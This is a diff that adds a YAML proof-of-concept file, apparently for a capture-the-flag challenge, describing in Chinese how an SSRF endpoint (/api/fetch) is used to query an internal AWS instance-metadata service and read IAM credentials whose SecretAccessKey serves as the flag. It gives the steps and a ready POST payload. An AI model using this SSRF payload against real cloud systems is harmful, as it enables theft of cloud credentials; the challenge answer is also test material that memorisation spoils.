@@ -1,0 +1,17 @@
+info:
+  name: ec2-ssrf-portal-imds
+  cve: ''
+  summary: SSRF访问AWS IMDS元数据服务获取IAM凭据(flag)
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: SSRF访问AWS IMDS元数据服务获取IAM凭据(flag)
+  steps:
+  - 1. 识别SSRF端点(/api/fetch)
+  - 2. /api/status泄露内部元数据端点http://imds:8080
+  - 3. 访问 /latest/meta-data/iam/security-credentials/ 列出角色
+  - 4. 访问 /latest/meta-data/iam/security-credentials/<role> 获取凭据，SecretAccessKey即flag
+  payload: POST /api/fetch {"url":"http://imds:8080/latest/meta-data/iam/security-credentials/<role>"}
+  verification: SSRF访问AWS IMDS元数据服务获取IAM凭据(flag)
